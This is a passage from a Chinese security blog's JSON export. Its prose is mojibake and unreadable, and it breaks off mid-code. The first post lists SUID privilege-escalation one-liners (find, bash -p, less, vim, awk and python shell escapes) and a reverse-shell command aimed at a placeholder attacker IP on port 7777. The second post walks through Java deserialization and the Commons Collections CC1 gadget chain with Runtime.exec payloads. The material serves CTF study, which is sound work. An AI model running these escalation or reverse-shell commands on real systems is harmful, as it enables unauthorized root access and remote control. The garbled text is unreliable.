ä¸€äº›å°æ€è€ƒ\n\nä»¥ä¸‹æœ‰äº›å‘½ä»¤è¯´æ˜¯ææƒä½†æ˜¯åªæ˜¯è¿›å…¥ä¸€ä¸ªshelläº¤äº’ç•Œé¢ ä½†æ˜¯ç”¨æˆ·è¿˜æ˜¯érootçŠ¶æ€ \n\nç½‘ä¸Šå¥½å¤šæ–‡ç« ä¹Ÿåªæ˜¯æ­¢æ­¥äºæ­¤ å¹¶æ²¡æœ‰è§£é‡Šçš„æ¸…æ¥š\n\nå½“ç„¶ä¹Ÿå¹¶ä¸èƒ½è¯´å®ƒææƒå¤±è´¥äº†\n\nææƒä¸æ˜¯è¯´ä¸€å®šè¦æå‡åˆ°rootç”¨æˆ· åªè¦èƒ½è¾¾åˆ°**è¶Šæƒ**æ•ˆæœ**ï¼Œ**é‚£ä¹ˆä¹Ÿç®—æ˜¯ç‹­ä¹‰çš„ææƒäº†\n\nå…·ä½“æ•ˆæœè¿˜è¦æ ¹æ®é¢˜ç›®æˆ–è€…çœŸå®ç¯å¢ƒè€Œå·²ï¼Œä½†æ˜¯èƒ½è¿›å…¥shellç•Œé¢æ€»å½’æ˜¯ä¸€ä¸ªå¥½çš„å¼€å§‹\n\n## å‰æ\n\nä»¥ä¸‹å‘½ä»¤éƒ½æ˜¯åŸºäºè‡ªèº«å·²ç»è¢«èµ‹äºˆäº†suid\n\nä¾‹å¦‚è¿™é‡Œçš„findå‘½ä»¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302463326-c4705fe8-a5a3-4014-87c3-0a4ecdda6fe9.png)\n\n## find\n\nä¸è¿‡ä¸€èˆ¬åœ¨å®æˆ˜ä¸­éƒ½æ˜¯åœ¨/tmpä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶\n\n```plain\nfind ä»»æ„æ–‡ä»¶filename -exec whoami \\; -quit\nfind ä»»æ„æ–‡ä»¶filename -exec /bin/sh -p \\; -quit\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302590191-1c53604d-2262-48c5-bda1-9ae0f0a0b135.png)\n\nç½‘ä¸Šè¿˜æœ‰åˆ©ç”¨è¿™ä¸ªfindå‘½ä»¤è¿›è¡Œåå¼¹shellææƒçš„ï¼Œä½†æ˜¯åå¼¹shellå¹¶æ²¡æœ‰ææƒï¼Œè¿˜æ˜¯érootç”¨æˆ·\n\nè¿˜æ˜¯è¯´æˆ‘kaliç‰ˆæœ¬å¤ªé«˜äº†è¢«ä¿®å¤äº†\n\n```plain\nfind 1.txt -exec bash -c 'bash -i >& /dev/tcp/ip/7777 0>&1' \\; -quit\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302838433-de1e7e64-d8c0-4c4a-baba-8cecb44ff71b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695302856860-4dc3d84c-1bcb-44c1-a055-07676085a3a9.png)\n\n## bash\n\n```\nbash -p\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306625262-713b59c5-1c4d-4bb0-a5b5-230412369279.png)\n\n## env\n\n```\nenv shell\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307266506-96ed29d7-5765-4174-9ce8-cd53bef4d22e.png)\n\n## ionice\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307617177-39000dd9-3c91-41d1-ae2c-bcb3d7818b34.png)\n\n## nice\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307728837-ba456bf8-da4c-4829-b03b-4ab444a775f8.png)\n\n## less/more\n\næ–‡ä»¶å¹¶éæ˜¯/etc/passwd åªè¦æ˜¯å†…å®¹å¤šçš„æ–‡ä»¶éƒ½è¡Œ\n\n```plain\nless /etc/passwd\n!/bin/sh\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695303340197-a26ab244-f582-47bd-b027-f4b2fac1c1a0.png)\n\n## flock\n\n```\nflock -u / whoami\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307508773-66215c04-f3d8-413f-9265-1d90b3b519df.png)\n\n## vim\n\n```plain\nvim.tiny /etc/passwd\n!/bin/sh\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695305813211-039f1589-170f-407d-aa7c-00f9ab781ec9.png)\n\n## nano\n\n```plain\nnano\nctrl + R\nctrl + X\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695306058324-eab07ed1-1309-45bd-94d0-eeec710bebc8.png)\n\n## awk\n\n```plain\nawk 'BEGIN {system(\"/bin/sh\")}'\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307032638-b2a32ae6-9208-4a77-b2dc-52e1e871b0e3.png)\n\n## python \n\nåœ¨ä¹‹å‰ctfä¸€é“é¢˜ç›®é‡åˆ°çš„ å½“ç„¶å‰ææ˜¯å¾—æœ‰suid\n\n```\npython3 -c \"import os;os.execl('/bin/sh','sh','-p')\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695307980036-d2044bf2-f133-4fc6-a53d-300f98457eca.png)\n\n# ç»ˆæå·¥å…·\n\nä¸€ä¸ªåœ¨çº¿ç½‘ç«™ æŸ¥çœ‹å‘½ä»¤å­˜åœ¨suidå‘½ä»¤çš„ç”¨æ³•\n\nhttps://gtfobins.github.io/\n\n# åè¯\n\nåˆ©ç”¨suidææƒä¸»è¦æ€è·¯:\n\n1. é¦–å…ˆæ‰¾åˆ°æ‰€åœ¨ç¯å¢ƒä»¥åŠå…·æœ‰suidçš„æ–‡ä»¶\n2. ç„¶åæ‰¾åˆ°ç›¸åº”å‘½ä»¤è¿›å…¥shelläº¤äº’çš„æ–¹æ³•\n3. æ‰§è¡Œshell\n\né‡åˆ°é¢˜ç›®ç¯å¢ƒå›æ¥æ‰¾æ‰¾çœ‹å°±è¡Œäº†:)\n\nè‡³æ­¤ å…ˆåˆ°è¿™é‡Œ\n\n# å‚è€ƒï¼š\n\nhttps://m.freebuf.com/articles/web/272617.htmlSUID\n\nhttps://tttang.com/archive/1793/#toc_strace\n\nhttps://xz.aliyun.com/t/12535#toc-14\n","categories":["çŸ¥è¯†å­¦ä¹ "]},{"title":"Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–","url":"/post/5e5c5c3.html","content":"\nJavaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–+ccé“¾\n\n<!--more-->\n\n# å‰è¨€\n\n> *Java åºåˆ—åŒ–æ˜¯æŒ‡æŠŠ Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼ŒObjectOutputStreamç±»çš„ writeObject() æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚*\n>\n> *Java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸º Java å¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectInputStream ç±»çš„ readObject() æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚*\n\nåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ˜¯è®© Java å¯¹è±¡è„±ç¦» Java è¿è¡Œç¯å¢ƒçš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆçš„å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨\n\nä¸PHPä¸åŒçš„æ˜¯phpå¤§æ¦‚æ˜¯åºåˆ—åŒ–ç”Ÿæˆä¸€ä¸²åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè€Œjavaæ˜¯ç”Ÿæˆäº†å­—èŠ‚æµæ–‡ä»¶\n\nPHPé€šè¿‡ä¸€ä¸²å­—ç¬¦ä¸²æ¥åœ¨å„ç§è¿è¡Œç¯å¢ƒä¸­ç©¿æ¢­ï¼Œè€Œjavaé€šè¿‡ä¸€ä¸ªå­—èŠ‚æµæ–‡ä»¶æ¥ç©¿æ¢­\n\nåŒæ—¶javaæ²¡æœ‰ç±»ä¼¼äºpythonæˆ–è€…phpçš„é­”æœ¯å‡½æ•°ï¼Œå®ƒæ˜¯é€šè¿‡é“¾å¼è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒçš„æ–¹å¼æ¥æ„é€ æ¶æ„é“¾\né™¤æ­¤ä¹‹å¤–æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™å…¶é»˜è®¤çš„`readObject()`å‡½æ•°æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€äº›æ¶æ„å‘½ä»¤æ‰§è¡Œå‡½æ•°\n\n# åºåˆ—åŒ–\n\né¦–å…ˆéœ€è¦ä¸€ä¸ªç›®æ ‡ç±»\n\n```java\npackage com.Z1d10t;\nimport com.learn.learning;\n\nimport java.io.Serializable;\n\npublic class Student implements Serializable {\n    private String name=\"Tom\";\n    public int age = 1;\n\n    public transient String hobby = \"basketball\"; //ä¸ä¼šå‚ä¸åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\n\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n    private void display(String name){\n        System.out.println(\"This is \"+name);\n    }\n    public void see(int age){\n        System.out.println(\"Age is \"+age);\n    }\n\n    @Override\n    public String toString() {\n        return \"Student{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\nç„¶åæ˜¯æˆ‘ä»¬çš„åºåˆ—åŒ–è¿‡ç¨‹\n\n```java\npackage com.Z1d10t;\n\nimport java.io.FileOutputStream;\nimport java.io.ObjectOutputStream;\n\npublic class Serialize {\n    public static void main(String[] args) throws Exception {\n        //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡\n        Student stu = new Student();\n        //åˆ›å»ºæ–‡ä»¶æµ\n        //åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„æ•°æ®æ–‡ä»¶ è¿™é‡Œèµ·åä¸ºser.serå¯ä»¥ä»»æ„å–\n        FileOutputStream fileOutputStream = new FileOutputStream(\"ser.ser\");\n        //åˆ›å»ºå¯¹è±¡è¾“å‡ºæµ\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);\n        //å°†æˆ‘ä»¬çš„å¯¹è±¡åºåˆ—åŒ–å†™å…¥å¯¹è±¡è¾“å‡ºæµ ä¹Ÿå°±æ˜¯ser.seræ–‡ä»¶ä¸­\n        objectOutputStream.writeObject(stu);\n        //é‡Šæ”¾èµ„æº å…³é—­æµ\n        objectOutputStream.close();\n        fileOutputStream.close();\n    }\n\n}\n```\n\néœ€è¦æ³¨æ„çš„æ˜¯ æˆ‘ä»¬è¦è¿›è¡Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–éœ€è¦å¸¦æœ‰ `Serializable`æ¥å£æ‰è¡Œ\n\nè¿˜æœ‰å…³é”®å­—`transient`ç”³æ˜çš„å±æ€§ä¸ä¼šå‚ä¸åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\n\n# ååºåˆ—åŒ–\n\n```java\npackage com.Z1d10t;\n\nimport java.io.FileInputStream;\nimport java.io.ObjectInputStream;\n\npublic class Unserialize {\n    public static  void main(String[] args) throws Exception {\n        //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡\n        FileInputStream fileInputStream = new FileInputStream(\"ser.ser\");\n        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);\n        //æ¢å¤å¯¹è±¡\n        Student stu2 = (Student) objectInputStream.readObject();\n\n    }\n\n}\n```\n\nå¯è§hobbyå±æ€§å¹¶æ²¡æœ‰è¢«ååºåˆ—åŒ–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179428869-b952b548-017a-428c-8dc2-567f9982efa7.png)\n\n# ç®€å•åˆ©ç”¨\n\nå¦‚æœæˆ‘ä»¬åœ¨ç›®æ ‡ç±»ä¸­é‡å†™readObjectå‡½æ•° å¹¶ä¸”è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179646673-b6e09605-1d54-46a9-a676-d4d3801e850d.png)\n\n```java\nprivate void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{\n        //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•\n        in.defaultReadObject();\n        //æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤\n        Runtime.getRuntime().exec(\"calc\");\n    }\n```\n\nå½“æˆ‘ä»¬ååºåˆ—åŒ–æ‰§è¡Œ`readObject()`çš„æ—¶å€™ å°±ä¼šè‡ªåŠ¨è°ƒç”¨æˆ‘ä»¬çš„å‘½ä»¤å‡½æ•°äº†\n\nè¿™é‡Œéœ€è¦æ³¨æ„å°±æ˜¯æˆ‘ä»¬è¿˜æ˜¯éœ€è¦æ‰§è¡Œç³»ç»Ÿé»˜è®¤è®¾ç½®çš„`in.defaultReadObject();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695179805874-0bd15737-f88c-4d37-ae39-1d602a66a5a2.png)\n\n# cc1é“¾å¤ç°\n\n## ç¯å¢ƒæ­å»º\n\næ— è„‘çœ‹è¿™ä¸ªå¸ˆå‚…çš„é“¾æ¥æ­å°±è¡Œäº†[JAVAå®‰å…¨åˆæ¢(ä¸‰):CC1é“¾å…¨åˆ†æ - å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/12669#toc-3)\n\néœ€è¦æ³¨æ„çš„æ˜¯ é…ç½®å¥½mavenä¹‹å å°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æŠŠComments-Collections-3.2.1ä¸‹è½½åˆ°æœ¬åœ°ä»“åº“\n\nå°±ä¸ç”¨å†å»æ‰¾æºç äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715437217-786b7c76-a173-4f66-b126-63d10b4db4ea.png)\n\nå…¶æ¬¡è¿˜è¦å°†å…¶åŠ è¿›å»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695715472115-a7d5acc8-04ef-4e5d-a545-d23e92d9749e.png)\n\n## æºå¤´åˆ©ç”¨ç‚¹\n\nè¿™ä¸ªé“¾å­çš„æºå¤´æ˜¯Common Collectionsåº“ä¸­çš„`Transformer`æ¥å£\n\nå¯»æ‰¾ä¸€ä¸‹ç»§æ‰¿äº†è¿™ä¸ªæ¥å£çš„ç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454148260-4d7efa22-95fc-4ac2-bfff-a7f0d4b749b4.png)\n\næœ‰å¾ˆå¤š ä½†æ˜¯ä¸»è§’æ˜¯`InvokerTransformer` \n\næˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454286059-69488c32-f40f-4059-9a92-9a519a7a469d.png)\n\nå‘ç°æœ‰æˆ‘ä»¬å¾ˆç†Ÿæ‚‰çš„åå°„è°ƒç”¨é‚£ä¹ˆè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªåˆ©ç”¨ç‚¹ å¹¶ä¸”å®ƒè¿˜æ”¯æŒååºåˆ—åŒ– ç»§æ‰¿äº†Serializableæ¥å£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454750499-9f72da11-0375-417e-9ebb-dbb5f7a9126b.png)\n\nå†æ¥çœ‹ä»–çš„æ„é€ æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454338049-402a6a61-a492-46e7-811e-ec633bede5b3.png)\n\nä¸€å…±ä¸‰ä¸ªï¼Œåˆ†åˆ«ä¸ºæ–¹æ³•åï¼Œå˜é‡ç±»çš„æ•°ç»„ï¼Œå¯¹è±¡æ•°ç»„\n\nè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬æ™®é€šçš„é€šè¿‡åå°„è°ƒç”¨`Runtime`çš„è¿‡ç¨‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454584580-bda06e70-f932-492d-ad62-eff23551f134.png)\n\nå¦‚æœæŒ‰ç…§ä¸Šé¢`InvokerTransformerçš„transform`æ¥è°ƒç”¨çš„è¯ å°±æ˜¯è¿™æ ·\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695454630428-86637716-a9ba-43c2-8681-ebdbe96b30df.png)\n\nåˆ©ç”¨æˆåŠŸ\n\né‚£ä¹ˆè¿™æ ·æˆ‘ä»¬å°±æ‰¾åˆ°äº†æºå¤´åˆ©ç”¨ç‚¹ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­äº† é“¾å¼è°ƒç”¨\n\n## æ‰¾é“¾å­\n\nå»æ‰¾è°è°ƒç”¨äº†transformæ–¹æ³• \n\næœ‰å¾ˆå¤šç±»è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³• ä½†æ˜¯è¿™é‡Œå¤ç°`TransformedMap`çš„`checkSetValue`æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455310738-ab67a44b-6049-4cf2-b4cc-6a79d6bb5544.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æ–¹æ³•ç±»å‹å’Œæ„é€ éƒ½æ˜¯protected æ‰€ä»¥æˆ‘ä»¬åªèƒ½å†…éƒ¨è°ƒç”¨æˆ–è€…å­ç±»è°ƒç”¨ä¸å®ä¾‹åŒ– ä¸èƒ½å¤–éƒ¨è°ƒç”¨å»å®ä¾‹åŒ–\n\nçœ‹çœ‹æ„é€ å‡½æ•° è¿”ç°å®ƒä¼ è¿›æ¥ä¸€ä¸ªMapå¯¹è±¡ç„¶åå¯¹ä»–çš„é”®å’Œå€¼éƒ½è¿›è¡Œä¸€äº›æ“ä½œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455715878-319bf27f-4185-4294-943a-b8cc4e23cdb8.png)\n\nå‘ä¸Šæ‰¾ çœ‹çœ‹è°è°ƒç”¨äº†æ–¹æ³•æˆ–è€…æ„é€ äº†å®ä¾‹\n\nå‘ç°`docorate()`æ–¹æ³•å¯¹å®ƒè¿›è¡Œäº†å®ä¾‹åŒ– å¹¶ä¸”è¿˜æ˜¯staticç±»å‹ é‚£ä¹ˆå°±å±äºæ˜¯ç±»çš„æ–¹æ³• ç›´æ¥é€šè¿‡`ç±»å.æ–¹æ³•å`å½¢å¼è°ƒç”¨å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695455831118-c7b630d3-3e22-43c9-b5e1-5a955cc7c745.png)\n\næˆ‘ä»¬å…ˆæ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œå®ä¾‹åŒ–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695457356419-c7e90a07-4480-45b5-8614-dd6230a6156f.png)\n\nè‡³äºè¿™é‡Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä»€ä¹ˆæ˜¯null  å› ä¸ºcheckSetValueåªå¯¹ç¬¬äºŒä¸ªå‚æ•°ä½œç”¨äº† æ‰€ä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¼ ä¸ä¼ éƒ½æ— æ‰€è°“\n\nTransformedMapè¿™ä¸ªç±»çš„`checkSetValue()`è°ƒç”¨äº†`transform()`![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642292657-090eb147-8e61-4514-9995-5323aa5d3c89.png)\n\né‚£ä¹ˆç»§ç»­ çœ‹çœ‹è°è°ƒç”¨äº†`checkSetValue()`\n\nå‘ç°åªæœ‰ä¸€å¤„è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°\n\nMapEntryç±»çš„`setValue()`å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642386652-aa186b04-327f-4a8f-be3a-b1c0e4017ce6.png)\n\nMapEntryç»§æ‰¿äº†AbstractMapEntryDecoratorè¿™ä¸ªç±» åŒæ—¶TransformedMapä¹Ÿç»§æ‰¿äº†è¿™ä¸ªç±»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645406099-850f6c2a-c71d-4b0a-b878-959003e669c3.png)\n\nAbstractMapEntryDecoratoræœ‰`setValue()`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642628028-60228ef8-f835-4b8f-835c-cba892ce4dde.png)\n\né‚£ä¹ˆç›¸å½“äºå­ç±»MapEntryé‡å†™äº†çˆ¶ç±»çš„`setValue()` å…¶å®æœ¬è´¨ä¸Šæ˜¯é‡å†™äº†Entryè¿™ä¸ªæ¥å£çš„å†…ç½®å‡½æ•°\n\nåŒæ—¶çˆ¶ç±»è¿˜æœ‰Map.Entryè¿™ä¸ªæ¥å£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695642712810-7347986d-56cd-4531-80f7-7a851e479460.png)\n\n## ç†è§£Entry\n\né‚£ä¹ˆè‡³æ­¤ æˆ‘ä»¬ç°éœ€è¦äº†è§£ä¸€ä¸‹ä»€ä¹ˆEntry\n\nç®€å•è¯´Entryå°±æ˜¯Mapé‡Œçš„é”®å€¼å¯¹ \n\nsetValue()æ˜¯Mapç±»çš„å†…ç½®å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695645691608-056df975-e8f1-4445-9cd4-7a61eed39660.png)\n\nå¸¸å¸¸ç”¨æ¥éå†mapå¯¹è±¡çš„æ—¶å€™è¿™æ ·ä½¿ç”¨ ä»å­—é¢æ„æ€ä¹Ÿèƒ½çœ‹å‡ºæ˜¯åœ¨èµ‹å€¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695646222714-9b3e4142-7931-4880-ab7d-95dfe1ab5645.png)\n\n## ç»§ç»­\n\nè¿™ä¸ªç±»MapEntryçš„çˆ¶ç±»åˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValueæ–¹æ³•\n\nåˆ°ç›®å‰ä¸ºæ­¢æ¥ç¼•ä¸€ç¼•æ€è·¯\n\nforå¾ªç¯éå†`transformdMap`->è°ƒç”¨`MapEntry`çš„`setValue()`->`transformdMap`çš„`checkSetValue()`->`InvokerTransformer.transform()`\n\néå¸¸å®Œç¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695647142500-9ff080bf-bd05-4910-955a-4dc57dde27f1.png)\n\nç°åœ¨ç»§ç»­æ¥çœ‹å“ªä¸ªå¯åˆ©ç”¨çš„ç±»è°ƒç”¨äº†`setValue()` \n\nå¦‚æœè°çš„`readObject()`å‡½æ•°è°ƒç”¨äº†`setValue()`é‚£ä¹ˆåˆšå¥½é—­ç¯ å²‚ä¸ç¾å“‰ï¼Ÿï¼Ÿï¼Ÿ\n\né‚£ä¹ˆå°±æ‰¾åˆ°äº†`AnnotationInvocationHandler`å®ƒçš„readObjectå‡½æ•°ç›´æ¥å°±è°ƒç”¨äº†`setValue()`å‡½æ•°\n\næ‰€ä»¥ååºåˆ—åŒ–æ—¶å€™å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ\n\nå¹¶ä¸”è¿˜æ˜¯éå†Entryæ¥æ‰§è¡Œçš„ éš¾é“è¿™å°±æ˜¯å¤©æ„å—\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695649837057-9e263bcc-9a7f-454e-a4df-b095d3028056.png)\n\næ¥çœ‹ä»–çš„æ„é€ å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695648493194-a326b7fe-335f-427e-b87a-a27f5650b66c.png)\n\næ¥å—ä¸¤ä¸ªå‚æ•° åˆ†åˆ«æ˜¯ï¼š\n\nç»§æ‰¿äº†æ³¨è§£çš„Class çœ‹è¿™ä¸ªç±»åä¹ŸçŸ¥é“å’Œæ³¨è§£æœ‰å…³ç³»\n\næ˜¯ä¸ªMap å¹¶ä¸”æˆ‘ä»¬å¯æ§ å¯ä»¥å°†ä¹‹å‰çš„`transformdMap` ä¼ å…¥\n\nä½†æ˜¯è¿™ä¸ªç±»æœ‰ä¸ªç¼ºé™·å°±æ˜¯ ä»–æ²¡æœ‰ç”³æ˜public ä¹Ÿå°±æ˜¯è¯´åªèƒ½åœ¨æœ¬packageè°ƒç”¨ å¦‚æœæƒ³è¦åœ¨å¤–éƒ¨è°ƒç”¨ å°±è¦ç”¨åå°„ å¹¶ä¸”åªèƒ½ç”¨å…¨é™å®šæ–¹å¼è°ƒç”¨  ä¹Ÿå°±æ˜¯`Class.forName(å®Œæ•´åŒ…å)`æ–¹å¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651081539-852c6ebb-416e-4c52-95c4-e81fbcd1e531.png)\n\nè¿™é‡Œå†è®¤è¯†ä¸€ä¸‹`Override`å®ƒæ˜¯ä»€ä¹ˆå‘¢ å®ƒæ˜¯ä¸€ä¸ªæ³¨è§£ å°±æ˜¯ç”¨æ¥è§£é‡Šç¨‹åºçš„é™„åŠ ä¿¡æ¯ ä¸ä¼šå½±å“ç¨‹åºçš„æ­£å¸¸è¿è¡Œ å¯ä»¥ç®€å•çœ‹ä½œä¸€ä¸ªæ³¨é‡Š å½“ç„¶ä¸ä¸¥è°¨ æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651156989-3fa22f7d-e40a-4e62-a238-1de53769c430.png)\n\nå¯ä»¥çœ‹åˆ°å®ƒä¸Šé¢è¿˜æœ‰ä¸¤ä¸ªæ³¨è§£ \n\né‚£ä¹ˆè¿™ä¸¤ä¸ªæ³¨è§£å«åšå…ƒæ³¨è§£ ä»–ä»¬æ˜¯ç”¨æ¥è§£é‡Šæ³¨è§£çš„\n\nTargetä¸€èˆ¬æ˜¯æ¥é™åˆ¶æ³¨è§£çš„ä½œç”¨å¯¹è±¡ \n\nRetentionæ¥é™åˆ¶æ³¨è§£ä½œç”¨é˜¶æ®µ æ¯”å¦‚æºä»£ç é˜¶æ®µè¿˜æ˜¯ç¨‹åºè¿è¡Œé˜¶æ®µ\n\né‚£ä¹ˆ è®©æˆ‘ä»¬æ¥è¿è¡Œä¸€ä¸‹ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651501430-438fa22d-5ac9-4e27-be24-fd93f6262a18.png)\n\næƒŠäº†ç›´æ¥è°ƒç”¨æˆåŠŸäº† è¿™é‡Œå…¶å®æ˜¯æœ‰é—®é¢˜çš„ è¿™é‡Œå¹¶ä¸æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–è°ƒç”¨è®¡ç®—å™¨æˆåŠŸçš„è€Œæ˜¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651551073-22e49eeb-b8ef-407d-8beb-30a5936f7a19.png)\n\næ‰€ä»¥è¦æŠŠè¿™ä¸€è¡Œæ³¨é‡Šäº† ä¸€å®šè¦æ³¨æ„åˆ°è¿™é‡Œï¼ï¼\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        Runtime r = Runtime.getRuntime();\n\n        //        Class<? extends Runtime> runtiomeClass = r.getClass();\n        //        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n        //        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n                                                                         new Class[]{String.class}, new Object[]{\"calc\"});\n        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //å…ˆåˆ›å»ºä¸€ä¸ªmapå¯¹è±¡\n        map.put(\"Z1d10t\",\"Z1d10t\");//ä»»æ„å¡«\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n        //        for(Map.Entry 